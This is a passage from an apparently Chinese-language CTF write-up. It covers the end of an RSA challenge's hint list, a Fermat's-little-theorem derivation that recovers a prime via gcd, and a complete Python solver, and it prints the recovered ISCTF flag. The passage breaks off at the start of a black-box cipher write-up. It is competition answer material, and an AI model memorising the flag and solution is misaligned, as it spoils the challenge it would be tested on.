class="line"><span class="string">Hint 42: 41, 11, 6984059054701243194406577182995741240436897138602476775543220094645161472633895356320870691493565356230021817198695018272393666667370608977208110764253393769787442206738887651454907864559105056199727308147026476795306714769493199003447522266774033773324562270207374768320253619068701592065984601594887388312013493599257403722865953095442171057100657271578293280686338908523864018983343500587769033822586560003572736592272152317739316444108939218480574158527171198620726886917802598591993658035939705289787249746288650701612275221097113840902054486416966701593345265607809381111897049158093808534604642731640119152868</span></span><br><span class="line"><span class="string">Hint 43: 13, 29, 9610425425501485449537748361164652677158792621032292104946727266655594704290554003044377640635938997615382559405839696633456524257520749570798069876408676921921508491566094310451535812726509625559772552216775984034994654686077581771306574807821000988687494843385541833458873739204271564568689723925761973189708592881482846646426280049739796580929850941981882154358359008000707906221459919505725630791914755910838899191924833300609856950819107362413681305294507489838444421285910012653866140490877420620551310798317895506704520509435554786438387597440096937627702835916143794698887778982888695219967982245649746655470</span></span><br><span class="line"><span class="string">Hint 44: 47, 97, 794708560552308405126546731517428100557886745717835758758542380710685584</span></span><br><span class="line"><span class="string">Hint 45: 3, 41, 4366286865897405386543255708293800522386204706169307328366554555364884083859171277798722946451756634920858627299532823660480318239049230750988476049477513092520844569149267106332990711387926038335306437738094725423916554317517443566123618496555545533680705744831228568422251969382492688050958971980479679805428102801749764130245809570484750989852311926567073592760547445916703018635471776441628270869914109919847570929937108398744190319099944135878164624117925789234408527770792315261913666378047301366117348007407689729553121872429672477943763065031289363375897860958687532065443830782060680953252171706108298186067</span></span><br><span class="line"><span class="string">Hint 46: 53, 13, 16599275744410550408933364882313950383421717117863259063696626313760940800128182804380262220526496674159136503269710326208644142632589833265263673629452996345476574747374747172655476596826644020872255782962700686562762713813009141052898954099526049199438330249525172937305118217295550996402876461138835393788249817466964132570303998739392864522160381559518796827917831858448710285259754350691301608261901046038810797165013301247129220438986641677769203536623610901604156282036632560795746698128751128683870700853339493839501889121028640592461819470558005091594236201609522690232023400257649767388230656904982965702400</span></span><br><span class="line"><span class="string">Hint 47: 61, 83, 9953189432255063894070711778963178970743198121753649081719130469512753806047549503962109442976714615255038871181051195512724207218843889262884288045589566753004137388059340730864662203711021106738767094228552897493653199240432249671119014845998208040396103544771523200759949973732641979644934204944350638114647371917538547803820215871447465362042956264048360078551647879310238285850657470764222027085496193016418088396386760643015475367197907378932626248164269818716905644542858090723472987968554892684192736976050169896444520698548656309379499864809652240244453616286236722509397142224233180948147011605558427902848</span></span><br><span class="line"><span class="string">Hint 48: 47, 73, 11137871466581047781242984634852964336706264103460602528475970728553465644713327296350923627071860721778412789236714773697433892321959279504008377433584604885817319604115996426320874382244073671694322092160768350159529231732048447670177579115854882538413223938721279445190025525651472499343624011272214336778696111400347742318222789215043195711269360705507743463500549755479755775737105743290208621332589467304719937369513194207595213182980370357559166180993485168866418076474829491707312908665547905615295104716814273672708222960604034067248688735024594069804630472429600684961470444745009128678939204098625367015452</span></span><br><span class="line"><span class="string">Hint 49: 37, 43, 8547801237237556680245447121357531340087815887730999035326630934574339083867172461996679202294604204246415617087303468869638590371489396511890451394149215396045103967365422720335104673107126428846330142015210956274026922065251671248521248406703003517010268831048835400375497130725745344823402860499648204664008236488552255035422928921490487905318800334939525030207122862220895298568207554924706494486709790089585773581447139024819366484617067643862923821174578132381404045225537724922355917737191443476738183156619271477344846716060997041706765920488392521346954370234605596534371205052913391651084238833069263785246</span></span><br><span class="line"><span class="string">Hint 50: 89, 7, 10398214245820233588167072072340460997067473220261572021578267549114000461324485988447437613040475809210011162256875428799327091235990171928216379105895288609773032862919523980293555963618323001564571973363418294497086861386518673361280706598614868452173330762143105775824076992409365806017218778102139861298703673447295670293191397994589110648541822608470022190616048229374246581750506635166699349805517119679503917519913987281318125804952325118589261418014369477837522696543190827291142488222603361805610512683583242709234195072960764001035300916480662591147878968245702960413084896858751962028377013605141587432900</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your goal: recover the flag by factoring n using the hints!</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
\begin{gather}
we\ know\ that\ H=b_i^{p-1}+b_j^{p-1}\ (mod\ n) \\
because\ n=p*q \\
so\ H \equiv (b_i^{p-1}+b_j^{p-1})\ (mod\ p) \\
and\ according\ to\ Fermat's\ Little\ Theorom\ H \equiv 2\ (mod\ p) \\
so\ we\ reach\ the\ conclusion\ p|(H-2) \\
notice\ that\ p|n \\
so\ we\ can\ get\ p\ from\ :\ p=gcd(H-2,n) \\
then\ we\ get\ q=n//p
\end{gather}</script><p><img src="/images/QianJianTec1766496917104.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"></span><br><span class="line">n = <span class="number">16926747183730811445521182287631871095235807124637325096660759361996155369993998745638293862726267741890840654094794027600177564948819372030933079291097084177091863985749240756085243654442374722882507015343515827787141307909182820013354070321738405810257107651857739607060274549412692517140259717346170524920540888050323066988108836911975466603073034433831887208978130406742714302940264702874305095602623379177353873347208751721068498690917932776984190598143704567665475161453335629659200748786648288309401513856740323455946901312988841290917666732077747457081355853722832166331501779601157719722291598787710746917947</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">7135669888508993283998887257526185813831780208680788333332044930342125381561919830084088631920301623909949443002073193381401761901398826719665411432016217400457613545308262831975564456231165114091904748808206330488231569773162745696602366468753664188261933014198218922459715972876740957260132243927549037840265753282534565674280908439875550179801788711737901632349136780584007599655055605772651127003711138512998683145763743839326460319440186099818507078433271291685194944254795690424327192625258701835654639832285402990995662846426561789508331799972329711410217802657682842382105869446853207634070295959281375484933</span></span><br><span class="line"></span><br><span class="line">hints_text = <span class="string">"""</span></span><br><span class="line"><span class="string">Hint 1: 11, 41, 403072318395713195475880235840306655046644537786837658466183670390322357403650602210882802453171853452</span></span><br><span class="line"><span class="string">Hint 2: 73, 7, 3401877351823051464833008106697922874740843547186522246399577691648145322938787488999079423405760696040635223407580102549819096176975820017380148265275786281647240647714533261221890310813882987089721138616513427711006945061727486708277298401545762448776593105730005387022319319199166969225690343981500127626848336242187816071435842118963634505746771844269484845077330851526393327015758760003053231670737896550596266539249975891234238005583184203089180325261872944167834576158878843510707348603774425827560724587546720860765943393963597645881666559247252842017499263265738255716811999328445725902262302532911214255949</span></span><br><span class="line"><span class="string">Hint 3: 59, 73, 695583691945177012011155613294846891840015729899504980764916686517371703553347581254163445300367305365949600797847620946823894152274689248119430670857791635723385692575931740078475490085973951317953049329486264578815530286784178680687403627415153526425715193114420845091853572366108176759184115038228886689580295865909953096284457818874267153151571968297454864850732608316298813594124020007025412733770104355236849081247730461956131749267446455113813284775308663385548094921945410215359273656658830019785099633226412843434625002115741084636776823289994271249660745143685585443820708578849162449717982725541307852715</span></span><br><span class="line"><span class="string">Hint 4: 53, 17, 971645701575323882519635342913625889703399294086</span></span><br><span class="line"><span class="string">Hint 5: 17, 53, 15015015166119321293244100074414416277924832658329700344653519929879563546652512240571777007009139132526751717913688831473249036114283479537249767699902565862566840754892319936718933957878788242522102884592375092063435348463420495622162622111752797419564087812071877456034189172928466087325995711799494559632348117577986369270044265839851198529901138826760234172452522279821372814789053868333623123766583799003287221335420456780264904184548645200345715153696373219687248029519611142514212181449677795769427641367964609639782220743835161725500332507591502818244881229659746207461229056486960160782643424330243354078694</span></span><br><span class="line"><span class="string">Hint 6: 59, 19, 4427802296687944448870952484227318</span></span><br><span class="line"><span class="string">Hint 7: 19, 43, 19174465169354813231681320402781559275699092043658101294284851123118510716279410</span></span><br><span class="line"><span class="string">Hint 8: 23, 31, 6031706827842456717715236244872427215835819411314168938820265741988730625387931647610750902952789928566569174296650515449892611198040938188209413722806254050103019879240215344570043498312370280623702924998835728624935413985841142180365335178468710734638030582183503463305813229510689954065159041592316788178873050291779739508108222965509434291492950189742558594400755699777715854046635146464467729949201239668741264832027750549876625288984575624485894153879412247669943493660233937543961086506015000295606199222800612415043850877838520358081044378561877650595040905680464898635661677396546195369907960492865630959945</span></span><br><span class="line"><span class="string">Hint 9: 73, 31, 14201978515584496685882877364621713654579319459919970854066889531106363038011334520524797899491133943665135480301300406440254472658620428164578914318059588912647092994632856690</span></span><br><span class="line"><span class="string">Hint 10: 31, 3, 17761887753093897979823770061456102763834352</span></span><br><span class="line"><span class="string">Hint 11: 13, 5, 4150700388609705807509972385476068337626559497757356803399419065000783917890225153250286903799441660433187538279583874523190497602462150199426414868861228792088666515397312761673326022980940385774334828394940770351447957541072690963220641780722897399543555486513918873014494692941882646929202605685305683969151271831603708612223260616432695010847067252877343217676963276876850265407927146383572955861063428706012170676831524971272198283920333900403902257748241220365118645448662797961778388544299359695919130547938351588261698392641490575786350259413542725944665834486513968924860904668074607650304874723425230270137</span></span><br><span class="line"><span class="string">Hint 12: 59, 53, 2093308535564899860358544644764036388478107502010763064242342417957960952425000274395405300689532194265342136032111944045432326085818281844400947666782274940461183395046865284971635536544260910022728631047126094710543502860882170401987674931187922422766222327719930375318976698721098197543008758760603140658147997152753438270623866111022164350986375651437321309108736011279113592001916870502347116720151257306071411569096876275005515839079136440506703094781753301521917670413306257490297241974169467740732230454155267623129991881695623072243477621355484939295049508367225410929080326109567111654067945546042372106278</span></span><br><span class="line"><span class="string">Hint 13: 11, 89, 5773679028890369456276328097218681131210336197851484718484213121094699090839722641329327818066934448088431288328288112007488949292271360565624555172295051667285077138864510745740214905953043079468933679191715551224964421931824712984605682049449568976492220103844351216496482668448767237697296740468431846671505265143619239976063901580555986558904470931013978569579237148514276178765419852198637961774494186181747458089405228411950572658310072067499489988259824774767508198451267875000556446298608250644009748818937568123418528009187811944967998576518784004540892824519032050506460017670585483238226301820712571645579</span></span><br><span class="line"><span class="string">Hint 14: 59, 19, 10974757986236006288348468568336947121923978268025782618680419380484847824293845383379274809628633982884248524866285416869994466804493799071019695089232140692475376148645650118342055726520583120333882910989811592931370723715884717392658914626279560914541425986351478710240862377226197891323537525676367683258652280225895980668977840969537035757009985713502197856706880646989184201990423727195172560560704893733494792945340405983958264929760613990510042281137251536502371683060105493456566203202995676363796508260438545252515574493473542492715179349497866152824132141129238032807684278789579870873990631709515352502373</span></span><br><span class="line"><span class="string">Hint 15: 11, 59, 8286765915642893643722267671556930668422080363489440619486004330134849571178036674986475802754804260626759450923775241201472288503107728483612582960417838690160802</span></span><br><span class="line"><span class="string">Hint 16: 3, 83, 8670564904343374156075891784422797917915847070310520984332279769504164524019002920437878667712734918407503893528964609388615752378009668179394550543334742880513288696193899579334352041612737521648871122300770732109991958777364103317237896209222739571605930423722098331428587046952745581887767018125449661836385756401767146216848185513274686419811084754784129338190887685792489185844961970682436930953762662159256843649680197802836233628748219421311091068027884246286801955132580168006746385788553263325371239064547214943270463799271582693307097866515323559640081377472410365311796667103389327125755510398234792960539</span></span><br><span class="line"><span class="string">Hint 17: 47, 71, 15189655529337297599070621327692775647472437654342284733419279459044091245709484592008784236836038238199431339530080798833863694019082099360867975411468181802365883838048650755521947739185044832121750278668725458779161264572106488221158049174704002405104694045711051726668876267794954827804265584531526809688162851528267958117474561865081871142026481602702358611977383838840467216409782013973906761226139903245114056975231832568083538564658843330419770362826462102622789108069389249602641189148715388059622341376715417265924644704691316367196722599195793773962428198040205512616444509750834973953022693785550802266112</span></span><br><span class="line"><span class="string">Hint 18: 19, 29, 14661046810005357468594301664850836437610256328712330874381003343699942748425302158171105550644727048051206458117828772075144383589551129619743654527620413132286889305278690645291359466534057249273843187124449541437587033949823571613090619667989912739101162245067852658322665279694710401800444138141346856093835079283227374648099624120782619771322472623630789096431414534527222485118949515372622085183912510018177895906649522504991475861146404995703763107816964209369487501529056212864220862713277632632268594192926804994930950930762255940853728034617285828125545163750399143037606327606535126251763073693473953686744</span></span><br><span class="line"><span class="string">Hint 19: 11, 89, 13357214564583644951510034650716277516325510600111365531856471059002907497767937445827192806732793166523983315887101899445087845542550038342480500237151465231405685422545530090065005109607310864977025325103465672450850540379234341279749113886947539400845321822481006994262700375964062063857363515290494376286961284725864589465065587339836635723085250544188242927462327068925005089561746960078398647971113589281563663689024296134195815738058179266887469473137997216792436310641839801585271790331365746442208348676200753457562160444740691258422882276851839616144554731981681550535123108350101531030525324694963994545288</span></span><br><span class="line"><span class="string">Hint 20: 13, 19, 9015439113692415723812039454602636203717179069784080604236209577969030957184510380132987544909218798262905505307236620420364723156896628015021747981816896133290154232921264396063118665954041870382404950626337554885082880595372492300185559547705412727112020773895391734178675568118417294113429562448849544338564697858353479059676992341239979279973948191000090925611122966827392226766571948922617345703402518639464697367975459916964712370264229447747875703346922955116402649868815187647332682627727429521327349380558524025434437065348919358179886784373948470464530596295968257196117932806673623409596232224263656709447</span></span><br><span class="line"><span class="string">Hint 21: 17, 89, 1232624071183606371752171179827692250773859330394635710762162149851456772281037111827897119725547063233395640472176481922500789994068941245743063373416785659254352015310032922118348550975562</span></span><br><span class="line"><span class="string">Hint 22: 67, 83, 1126066176169173986258375138688137558142264839106063302940880092042502490911057016254959754435510429411384392032847908273635563612047472121950839934733905729015943917767915064618640585969621038467420076188953203812632416692873236731402216410500667938438399832227071790611412372173974174687603713326333791754140419675029772154828193139783484205710539042656417324250808919494712510406268629862104562237889399268931862879343990757365436458551497886263701914349819002099339457690106946122543529626710290881457346334759953170142024757161589525394691005814751979092184245953191693247075620270045838678527511170972567753351</span></span><br><span class="line"><span class="string">Hint 23: 41, 97, 15061728396574720128871454281806425283902878531290205263072044930084328354647716799950058691868870125292816458036423472349601649870044904984377004711678761714808846252355372756850495640148784156530292575757175420916873271609977179541391067607437946628688811886889502712607514447458904992024279765998865875618672417318528806259694052202283848620150531327490085874935926140164888318138777816635210686133434879564761574366090585467327313351792501721900090022412568322566880308204689579089754113916523137219409702840025596606460438071507115794360457519041650146002247978792944063933568992230154174930543323173071240960636</span></span><br><span class="line"><span class="string">Hint 24: 7, 23, 107006904423598033367949136709476534616</span></span><br><span class="line"><span class="string">Hint 25: 79, 47, 11094334665560612802457947914579705831928780165312070004861180761238832002874428458670163845939464475999733253092738012391076484871479088986479536610030564639805718143084622127711215172458485326388902083413575454799106868355391943732802994224342313418146481622340282330554260946195940723120836406549666330792363893799020720281135898034922255022048435484533585962047978284629786026663018345757890693521562666203031553493103945295693195640052093415731503407816366337336182698796883001653465915740746118519384260984893835094879165736186434278489286286227662273545663256993867922180157248380291757381125272120891684062194</span></span><br><span class="line"><span class="string">Hint 26: 59, 73, 4064264878148785166802093462858575465400091342645180541176126645875623098033551060982695656331190143572426766578696362147717218779335361493125256534627342192680373626652482508115615860816250319187188097915962706304133850035098343668277834974105321147191342624944627482006284223163704828843061145141268544104282644658022010819808655796239544272048394743182820455393255285941665799519906799024432739271653191031181064778284104887384076188431552852025837101339257686236262365247791750207700069395619856622961279534162976795147959769683692604340368460731405668330115156114576764572051491629821619308816381773343755003534</span></span><br><span class="line"><span class="string">Hint 27: 67, 37, 13951782965760049234481961368802553800278133941697263631552649243302664977209715848353709633491008434674270268090076527067844931388512019333805006404853566312201157392447713057698715800623288234051899693554210937852453814575305705182660789018065999222430838475037429354174069134372859946362529872754325135924297601113491133129277121309644377255711296412090554983403167436585565758988120192517511808267055408632606896756685326534561420410005038161122481109870042764517919065341900975187982359357007105413042469550052322588976438466403370644683889314221651454587673986716491269580073476431119104550125907982617819198239</span></span><br><span class="line"><span class="string">Hint 28: 71, 31, 14592451107942406172703460352000704126425716661469483183610425663886284772375260143470595014699236417504356417924516247683378564032172689094243907515271202472795378941272772693424353756938883720892780719870429492112844354792067076527090697208293397879373413452057503440196643066732299886678533556377726500394447831070628632364135576812382061688937462189566815186722078015421531935330987991868677259308976254080329342447669466494877857082494259824027412023017042305976083947770306599290459206333751309651343338718031684134413354721116695889173022783305688553309591139544114673672159391172663588390812561345603404875445</span></span><br><span class="line"><span class="string">Hint 29: 61, 37, 150312118586919145020616357224172487248862369450901081305248777087453651799298780184965167114015639778324633934952775965666791061680751287444693564273797597220185626300049938</span></span><br><span class="line"><span class="string">Hint 30: 47, 89, 5435525789990781146665058968159824543197878249058619814486157180575648579639831493916004219973973832266296536703517577992770</span></span><br><span class="line"><span class="string">Hint 31: 23, 47, 16103071775810171711924674905790805963818714309292465098237116772593040021211622298924186932004880334851627830206994635151992140064405277570483377357957039009351094902151630023493150975576584876244834021621269645929479405478143057020268612485343670663377970673925984030126760947109176763636955974818654880191024493408598053751276065135442200582652319408920748644591450674320233708025358524648197707659990862662361862539842868417063320792767415984991601751165223638123837341091365974671765054733794332399697028713963544373254318631595083356458002718583341127602790857490164278343070475882464426640213476914415482369850</span></span><br><span class="line"><span class="string">Hint 32: 29, 5, 13149325842021723251134510511729784479095642778506166091034934686556554381120350749714138697288609601129918017821541343485285067285202422145639363694603240119439803374916552440509169187395808575353190466385753062164445875730603626277916455911345416839502129509688066724158296752117066013823226052016786749548019509350864881585069802037870118674424466298682508091272797804735861773714128160193020313575834557745724129735757517340056227714959610755715392915985854554070909168057367535004631491240072926342019254725105436116655974774609052713231818128446311960013765270122065871739363402131985754839033491581530499347992</span></span><br><span class="line"><span class="string">Hint 33: 89, 47, 630043523370452187379224662747648830902214688021486477430843243593080113724992705480996062907676256037302619160067814028518895461989971281884155808829193898017336</span></span><br><span class="line"><span class="string">Hint 34: 19, 59, 5312300113767710347282768227082829679387523215214639151760217349511385597102767288546324009076948101196442028352053632460946433171294574346446379257281949909272350819311609431501573807000878460778313626108872598317920103278246614995180550162481588759079785633301645095994306260526442257399195256822168763040046685053639779110740308012206330181637380011462498603874585251040951562533555627840386291011622732627801692079226133918094516784934996032323522126557227339640405344352939596441336679652918394074410690904621730980459695004938137633444530118011543020946033976566969594506053598637256025269420788063085529221486</span></span><br><span class="line"><span class="string">Hint 35: 59, 3, 13338480097536050870847065134681408887393061870891194580910295898171005379071202538125320488322264936939611934926773854147441861842696082224910493485968940453414962504999277326912024770737526865763322593711772391102570024742439366641421857370464779798305027785021436688758138471130400190763565033556147205447698037378616533728663507465789889356211004747849498360714349678453175418183091908832867382402195272783569030789904261178845317149753713695808383033170623145131434242158410724256492198680651336056844232593215970896169424430059260906555229446741538286239350780216208715553935143523165464773688871774009588738407</span></span><br><span class="line"><span class="string">Hint 36: 67, 2, 8256928556897492704838762552986750294374712035464071847912955091323033935694693535736594865997626239305042785518308139569682623007419575794366667620985270619928978345775201291927479777879409352040290541010779775363393802966114845982777093715738330158248145557248971011553853095404328553837691636026735523457849132602891079774484964955413419103753159331087739019434888120001297351898315190776895144785024767468167340726846414096469818750219466508467856583779003457862584610836846910059997868710036273917335512342095635575374346404071250572917845292452258621324256922950179010754476790644241744968537946791784277331172</span></span><br><span class="line"><span class="string">Hint 37: 11, 89, 469829525495433863398701036274262995240821686827512278740409156383771339857992568557981522</span></span><br><span class="line"><span class="string">Hint 38: 53, 17, 15381013223078846537731461466880636394199540595403435401138127547481863401431466372374802606225281410197388364722944495843405467862781503434970989158584650159590980399087359088118746163629618532987297413548047215179053477589410157484215376788161320381404390190467326828317085039705167675630596365709188985681649747552770255068423205419746730136649403555515290098619746175600947097893366036430479763751257652595334352418296864541247999321025232348500763810371215286305853572498789766256531460974011022731922336715523379552064525311328532274496963226072015892784253991084576242734695083889820166631064731394426574244137</span></span><br><span class="line"><span class="string">Hint 39: 59, 3, 8639902842024035953048638563768315927624671856924547112209526883962456853052089935252707927468432895933170836045185383394096573378220873632433306851623471094895240704466661122788392467144892335530991171751297377896525529639348516066396938968040587426508605861054726429454030686327018745441753930983556245291730653368996527050046737903050080495173995563726990564829713815768651787483101363848070083858443766098560638337868296111441788798574965477355431173836128839250967090465226610709666720508328978510631834435136772497463531551713080290889081436462800389414847971067210139076388894646477223534324245688231308651402</span></span><br><span class="line"><span class="string">Hint 40: 71, 2, 35228394523315997738820412922291535639435039748226420541446858967158850258697393757215146296389518178994242807247547892971367759083443187781159</span></span><br><span class="line"><span class="string">Hint 41: 71, 89, 6240983929786483220051416467719053988488038641934890929981073832233939427834145472336915358758745943895354212032680367743535480193473825955326802869864352912264819240397323037315537988324410288546472301626890591739573348191915387074878814318018257079325106269383242877918486075024690767741729879076813581842036944498326059102754583317760100647490256432861228914984872474683425397073112462956198249407553140398404673370857128292911829788563089759423977978816627360219756198454057710015406165962422617662704219899517474510659197047034325834333381214858621450033089047323717051044225354940003754145032127292424992011101</span></span><br><span class="line"><span class="string">Hint 42: 41, 11, 6984059054701243194406577182995741240436897138602476775543220094645161472633895356320870691493565356230021817198695018272393666667370608977208110764253393769787442206738887651454907864559105056199727308147026476795306714769493199003447522266774033773324562270207374768320253619068701592065984601594887388312013493599257403722865953095442171057100657271578293280686338908523864018983343500587769033822586560003572736592272152317739316444108939218480574158527171198620726886917802598591993658035939705289787249746288650701612275221097113840902054486416966701593345265607809381111897049158093808534604642731640119152868</span></span><br><span class="line"><span class="string">Hint 43: 13, 29, 9610425425501485449537748361164652677158792621032292104946727266655594704290554003044377640635938997615382559405839696633456524257520749570798069876408676921921508491566094310451535812726509625559772552216775984034994654686077581771306574807821000988687494843385541833458873739204271564568689723925761973189708592881482846646426280049739796580929850941981882154358359008000707906221459919505725630791914755910838899191924833300609856950819107362413681305294507489838444421285910012653866140490877420620551310798317895506704520509435554786438387597440096937627702835916143794698887778982888695219967982245649746655470</span></span><br><span class="line"><span class="string">Hint 44: 47, 97, 794708560552308405126546731517428100557886745717835758758542380710685584</span></span><br><span class="line"><span class="string">Hint 45: 3, 41, 4366286865897405386543255708293800522386204706169307328366554555364884083859171277798722946451756634920858627299532823660480318239049230750988476049477513092520844569149267106332990711387926038335306437738094725423916554317517443566123618496555545533680705744831228568422251969382492688050958971980479679805428102801749764130245809570484750989852311926567073592760547445916703018635471776441628270869914109919847570929937108398744190319099944135878164624117925789234408527770792315261913666378047301366117348007407689729553121872429672477943763065031289363375897860958687532065443830782060680953252171706108298186067</span></span><br><span class="line"><span class="string">Hint 46: 53, 13, 16599275744410550408933364882313950383421717117863259063696626313760940800128182804380262220526496674159136503269710326208644142632589833265263673629452996345476574747374747172655476596826644020872255782962700686562762713813009141052898954099526049199438330249525172937305118217295550996402876461138835393788249817466964132570303998739392864522160381559518796827917831858448710285259754350691301608261901046038810797165013301247129220438986641677769203536623610901604156282036632560795746698128751128683870700853339493839501889121028640592461819470558005091594236201609522690232023400257649767388230656904982965702400</span></span><br><span class="line"><span class="string">Hint 47: 61, 83, 9953189432255063894070711778963178970743198121753649081719130469512753806047549503962109442976714615255038871181051195512724207218843889262884288045589566753004137388059340730864662203711021106738767094228552897493653199240432249671119014845998208040396103544771523200759949973732641979644934204944350638114647371917538547803820215871447465362042956264048360078551647879310238285850657470764222027085496193016418088396386760643015475367197907378932626248164269818716905644542858090723472987968554892684192736976050169896444520698548656309379499864809652240244453616286236722509397142224233180948147011605558427902848</span></span><br><span class="line"><span class="string">Hint 48: 47, 73, 11137871466581047781242984634852964336706264103460602528475970728553465644713327296350923627071860721778412789236714773697433892321959279504008377433584604885817319604115996426320874382244073671694322092160768350159529231732048447670177579115854882538413223938721279445190025525651472499343624011272214336778696111400347742318222789215043195711269360705507743463500549755479755775737105743290208621332589467304719937369513194207595213182980370357559166180993485168866418076474829491707312908665547905615295104716814273672708222960604034067248688735024594069804630472429600684961470444745009128678939204098625367015452</span></span><br><span class="line"><span class="string">Hint 49: 37, 43, 8547801237237556680245447121357531340087815887730999035326630934574339083867172461996679202294604204246415617087303468869638590371489396511890451394149215396045103967365422720335104673107126428846330142015210956274026922065251671248521248406703003517010268831048835400375497130725745344823402860499648204664008236488552255035422928921490487905318800334939525030207122862220895298568207554924706494486709790089585773581447139024819366484617067643862923821174578132381404045225537724922355917737191443476738183156619271477344846716060997041706765920488392521346954370234605596534371205052913391651084238833069263785246</span></span><br><span class="line"><span class="string">Hint 50: 89, 7, 10398214245820233588167072072340460997067473220261572021578267549114000461324485988447437613040475809210011162256875428799327091235990171928216379105895288609773032862919523980293555963618323001564571973363418294497086861386518673361280706598614868452173330762143105775824076992409365806017218778102139861298703673447295670293191397994589110648541822608470022190616048229374246581750506635166699349805517119679503917519913987281318125804952325118589261418014369477837522696543190827291142488222603361805610512683583242709234195072960764001035300916480662591147878968245702960413084896858751962028377013605141587432900</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line"></span><br><span class="line">    lines = hints_text.strip().split(<span class="string">'\n'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        line = line.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 解析格式: "Hint 1: 11, 41, 4030..."</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">':'</span> <span class="keyword">not</span> <span class="keyword">in</span> line: <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            content = line.split(<span class="string">':'</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">            parts = content.split(<span class="string">','</span>)</span><br><span class="line">            </span><br><span class="line">            hint_val = <span class="built_in">int</span>(parts[<span class="number">2</span>].strip())</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 计算 p = gcd(hint_value - 2, n)</span></span><br><span class="line">            p = math.gcd(hint_val - <span class="number">2</span>, n)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> p &gt; <span class="number">1</span> <span class="keyword">and</span> p &lt; n:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"[+] Success! Found factor p from <span class="subst">{line.split(<span class="string">':'</span>)[<span class="number">0</span>]}</span>"</span>)</span><br><span class="line">                </span><br><span class="line">                q = n // p</span><br><span class="line"></span><br><span class="line">                phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">                d = inverse(e, phi)</span><br><span class="line">                </span><br><span class="line">                m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">                flag = long_to_bytes(m)</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"\n[+] Flag: <span class="subst">{flag.decode(errors=<span class="string">'ignore'</span>)}</span>"</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
<p>得到<strong>ISCTF{M0dIFi3D_f3RM47_7H30r3m_I5_fUn_8U7_h4rD3r!}</strong></p>
<p>实际上这题只需要一个hint即可恢复出素数p？</p>
<ul>
<li><p>小蓝鲨的密码箱</p>
<blockquote>
<p>小蓝鲨有一个神秘的black-box，里面藏着它最珍贵的秘密。小蓝鲨告诉我们，只有知道密码箱的运算逻辑，你才能知道它的秘密。</p>
</blockquote>
</li>
</ul>
<p>这题比较传奇，误打误撞做对了</p>
<p>密码黑盒，要求输入a,b,c和明文</p>
<p>既然是黑盒那就试试看，明文设为A，经过几次尝试发现：</p>
<p>1.a,b,c!=0</p>
<p>2.a,c允许是负数</p>
<p>在测试数字1的时候密文始终输出来是00，a=b=1,c=-2的时候输出：</p>
